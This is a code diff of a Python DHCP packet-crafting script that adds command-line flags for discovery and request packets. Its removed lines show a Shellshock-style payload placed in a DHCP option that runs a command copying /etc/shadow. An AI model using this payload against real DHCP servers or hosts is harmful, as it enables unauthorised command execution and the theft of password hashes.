@@ -1,9 +1,6 @@
-from binascii import hexlify
-import binascii
 import socket
-import select
 import collections
-
+import optparse
 
 def flatten_list(ze_list):
     for sublist in ze_list:
@@ -13,20 +10,19 @@ def flatten_list(ze_list):
             yield sublist
 
 
-
 class Client:
-    def __init__(self):
+    def __init__(self, discovery, request):
         self.ip = b'192.168.10.1'
         print(self.ip)
         self.port = 67
 
-        self.exploit = b"() { :;}; /usr/bin/cat /etc/shadow > /tmp/shadow -c echo ls"# % (self.ip, self.port)
-        self.exploit = [bytes(chr(x).encode('ascii')) for x in self.exploit]
-        print(self.exploit)
-        print(len(self.exploit))
-        self.exploit_len = (len(self.exploit)).to_bytes(1, byteorder='big')
-        print(self.exploit_len)
-        # exit()
+        if discovery is True:
+            self.type = 0
+        elif request is True:
+            self.type = 1
+        else:
+            print('[!] Packet type not defined use the argument -d or -r')
+            exit(1)
 
         self.dhcp_packet = self.craft_packet()
 
@@ -51,10 +47,13 @@ class Client:
         options = [b'\x35', b'\x01', b'\x01',  # DHCP, len, Offer
                    b'\x3d', b'\x07', b'\x01', chaddr, # client id
                    b'\x37', b'\x04', b'\x01', b'\x03', b'\x06', b'\x2a',
-                   b'\x72', self.exploit_len, self.exploit,
                    b'\xff',  # end flag
                    # padding to end at word boundry for the options
                    ]
+        if self.type == 0:
+            options[2] = b'\x01'
+        elif self.type == 1:
+            options[2] = b'\x03'
 
         options = list(flatten_list(options))
 
@@ -82,35 +81,29 @@ class Client:
 
         return_packet = bytearray(return_packet)
 
-
-
-
-
         return return_packet
 
     def start_sockets(self):
-        # self.recv_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        # self.recv_socket.bind(('', self.port))
-
         self.dhcp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         self.dhcp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
 
     def start(self):
         self.dhcp_socket.sendto(self.dhcp_packet, ('255.255.255.255', 67))
 
-        # data = self.recv_socket.recv(10000)
-        # print(data)
-        # while True:
-        #     r, w, x = select.select([self.recv_socket, []], [], [])
-        #     for each in r:
-        #         print('Recieved Something!')
-        #         frame, void = each.recvfrom(10000)
-        #         print(frame)
-
     def test(self):
         print(self.dhcp_packet)
+
 if __name__ == '__main__':
-    client = Client()
+    parser = optparse.OptionParser()
+    parser.add_option('-d', action='store_true', default=False, help='Send discovery dhcp packet')
+    parser.add_option('-r', action='store_true', default=False, help='Send discovery request packet')
+
+    options, args = parser.parse_args()
+
+    discovery = options.d
+    request = options.r
+
+    client = Client(discovery, request)
     client.test()
     client.start_sockets()
     client.start()
